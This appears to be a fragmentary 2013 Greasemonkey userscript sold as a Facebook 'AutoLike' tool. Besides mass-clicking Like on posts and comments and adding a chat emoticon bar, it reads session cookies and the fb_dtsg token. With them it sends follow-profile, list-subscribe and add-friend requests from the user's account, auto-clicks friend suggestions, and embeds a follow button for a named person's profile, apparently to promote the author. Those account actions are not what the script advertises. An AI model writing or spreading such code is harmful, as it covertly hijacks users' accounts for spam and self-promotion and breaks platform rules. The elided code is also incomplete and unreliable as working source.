// ==UserScript==
// @name			*[NEW]* AutoLike +PLUS Facebook 11/07/2013 [s.k.i.l]
// @namespace			*[Update]* AutoLike +PLUS Facebook 11/07/2013 S.k.i.l
// @description			*[Update]* AutoLike +PLUS Facebook 11/07/2013 S.k.i.l
// @author			s.k.i.l
...
function cereziAl(C) {
    ...
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(D);
        if (konum != -1) {
            konum += D.length;
...
function a(G) {
    ...
    var E = "/ajax/follow/follow_profile.php?__a=1";
    var F = "profile_id=" + G + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    H.open("POST", E, true);
...
function sublist(C) {
    ...
    D.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + C + " }).send();";
...
if (gf.readyState != 4) {} else {
    ...
    if (data.error) {} else {
        friends = data.payload.entries.sort(function (C, D) {
...
function sarkadasekle(H, F) {
    var E = new XMLHttpRequest();
    E.onreadystatechange = function () {
        if (E.readyState == 4) {}
    };
    E.open("POST", "/ajax/add_friend/action.php?__a=1", true);
    var G = "to_friend=" + H;
    G += "&action=add_friend";
    G += "&how_found=friend_browser";
    G += "&ref_param=none";
    G += "&outgoing_id=";
    G += "&logging_location=friend_browser";
    G += "&no_flyout_on_click=true";
    G += "&ego_log_data=";
    G += "&http_referer=";
    G += "&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value;
    G += "&phstamp=165816749114848369115";
    G += "&__user=" + user_id;
    E.setRequestHeader("X-SVN-Rev", svn_rev);
    E.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    if (F == "farketmez" && document.cookie.split("cins" + user_id + "=").length > 1) {
        E.send(G)
    } else {
        if (document.cookie.split("cins" + user_id + "=").length <= 1) {
            cinsiyetgetir(H, F, "sarkadasekle")
        } else {
            if (F == document.cookie.split("cins" + user_id + "=")[1].split(";")[0].toString()) {
                E.send(G)
            }
        }
    }
...
function autoSuggest() {
    ...
    for (i in links) {
        l = links[i];
        if (l.innerHTML == '<span class="uiButtonText">הצע חבר</span>') {
            l.click()
        }
    }
}
...
if (body != null) {
    ...
    unsafeWindow.AutoLike = function () {
        ...
        for (var O = 0; O < T.length; O++) {
            if (T[O].getAttribute("class") != null && T[O].getAttribute("class").indexOf("UFILikeLink") >= 0 && (T[O].innerHTML == "Me gusta" || T[O].innerHTML == "Like" || T[O].innerHTML == "אהבתי" || T[O].innerHTML == "Suka" || T[O].innerHTML == "Beğen" || T[O].innerHTML == "أعجبني" || T[O].innerHTML == "いいね！" || T[O].innerHTML == "讚" || T[O].innerHTML == "Seneng" || T[O].innerHTML == "좋아요" || T[O].innerHTML == "J’aime")) {
                K[S] = T[O];
                S++
            }
        }
        ...
        function N(B) {
            K[B].click();
            var A = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: " + (B + 1) + "/" + K.length + "</center></a>";
            document.getElementById("like2").innerHTML = A
        }

        function L(A) {
            window.setTimeout(P, A)
        }
        ...
        function R() {
            ...
            for (var B = 0; B < A.length; B++) {
                var C = A[B].getAttribute("class");
                if (C != null && C.indexOf("uiButton uiButtonLarge uiButtonConfirm") >= 0) {
...
if (body != null) {
    ...
    unsafeWindow.LikeComments = function () {
        ...
        var K = new Array();
        for (var O = 0; O < T.length; O++) {
            if (T[O].getAttribute("data-ft") != null && (T[O].getAttribute("title") == "Me gusta este comentario" || T[O].getAttribute("title") == "Like this comment" || T[O].getAttribute("title") == "אוהב את התגובה" || T[O].getAttribute("title") == "Suka komentar ini" || T[O].getAttribute("title") == "Nyenengi tanggapan iki" || T[O].getAttribute("title") == "الإعجاب بالتعليق" || T[O].getAttribute("title") == "このコメントはいいね！" || T[O].getAttribute("title") == "좋아요 취소" || T[O].getAttribute("title") == "說這則留言讚" || T[O].getAttribute("title") == "J’aime ce commentaire" || T[O].getAttribute("title") == "Bu yorumu beğen")) {
                K[S] = T[O];
                S++
            }
        }
        ...
        function N(B) {
            K[B].click();
            var A = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: " + (B + 1) + "/" + K.length + "</center></a>";
            document.getElementById("like3").innerHTML = A
        }
...
if (body != null) {
    ...
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "3px";
    div.innerHTML = "<a style='font-weight:bold;color:#E30505' onclick='BugInfo()'><center>Funny Stuff</center></a></a>";
    body.appendChild(div);
    unsafeWindow.BugInfo = function () {
        window.open(this.href = "https://www.facebook.com/Funny.Israel", "dmfollow", "toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=yes,width=800,height=600");
        return false
    }
}
if (body != null) {
    ...
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "3px";
    div.innerHTML = "<iframe src='//www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2Feran.greenboum.1&amp;layout=button_count&amp;show_faces=true&amp;colorscheme=light&amp;font=arial&amp;width=450&amp;appId=461683983853869' scrolling='no' frameborder='0' style='border:none; overflow:hidden; height='10' ALIGN='center' allowTransparency='true'></iframe>";
    body.appendChild(div)
}
...
function getValue(E, D) {
    switch (storage) {
    case "greasemonkey":
        return GM_getValue("0-" + E, D);
    case "localstorage":
        var F = localStorage["femotbar-0-" + E];
        if (F == "true") {
            return true
        } else {
            if (F == "false") {
...
function createSelection(H, G, E) {
...
if (headTag) {
    ...
    styleTag.innerHTML = ".chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }.fbNubFlyoutInner {position:relative !important;bottom:0px !important;}";
...
function fInsertedNodeHandler(B) {
    if (B.target.getElementsByClassName && B.target.getElementsByClassName("fbNubFlyout fbDockChatTabFlyout")[0]) {
        fInsertEmotBar(B.target)
    }
}

function fInsertEmotBar(B) {
    fChatToolBox = B.getElementsByClassName("fbNubFlyoutHeader")[0];
    fNewEmotBar = fEmotBarDom.cloneNode(true);
    setVisibility(fNewEmotBar);
    for (i = 0; i < fNewEmotBar.firstChild.childNodes.length - 2; i++) {
        fNewEmotBar.firstChild.childNodes[i].addEventListener("click", fEmotClickHandler, false)
    }
    ...
    if (fChatToolBox.childNodes) {
        fChatToolBox.insertBefore(fNewEmotBar, fChatToolBox.childNodes[1])
    }
}

function fEmotClickHandler(J) {
    var F = J.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].getElementsByClassName("inputContainer")[0].getElementsByClassName("uiTextareaAutogrow input")[0];
    var H = getCursorPosition(F);
    var I = "";
    var G = "";
    if (F.value.charAt(H - 1) != " " && H - 1 > 0) {
        I = " "
    }
    if (F.value.charAt(H) != " ") {
        G = " "
    }
    F.value = F.value.substring(0, H) + I + J.target.getAttribute("alt") + G + F.value.substring(H);
    createSelection(F, H + J.target.getAttribute("alt").length + G.length + I.length, H + J.target.getAttribute("alt").length + G.length + I.length)
}

function fStyleClickHandler(H) {
    var J = H.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].getElementsByClassName("inputContainer")[0].getElementsByClassName("uiTextareaAutogrow input")[0];
    var L = J.value.substring(J.selectionStart, J.selectionEnd);
    var M = getCursorPosition(J);
    var I = L.length;
    if (I == 0) {
        J.value = J.value.substring(0, M) + H.target.getAttribute("alt") + J.value.substring(M);
        createSelection(J, M + 1, M + H.target.getAttribute("alt").length - 1)
    } else {
        var N = H.target.getAttribute("alt").charAt(0);
        var K = H.target.getAttribute("alt").charAt(0);
        while (J.value.charAt(M) == " ") {
            M += 1;
            I -= 1
        }
        while (J.value.charAt(M + I - 1) == " ") {
            I -= 1
        }
        if (J.value.charAt(M - 1) != " " && M - 1 > 0) {
            N = " " + N
        }
        if (J.value.charAt(M + I) != " ") {
            K += " "
        }
        J.value = J.value.substring(0, M) + N + J.value.substring(M, M + I) + K + J.value.substring(M + I);
        createSelection(J, M + I + 2, M + I + 2)
    }
}

function fHideShowEmotBar(B) {
...
function setVisibility(B) {
    if (setting_visible) {
        B.firstChild.setAttribute("style", "display: block;");
        B.childNodes[1].setAttribute("style", ArrowStyleUp)
    } else {
        B.firstChild.setAttribute("style", "display: none;");
        B.childNodes[1].setAttribute("style", ArrowStyleDown)
    }
};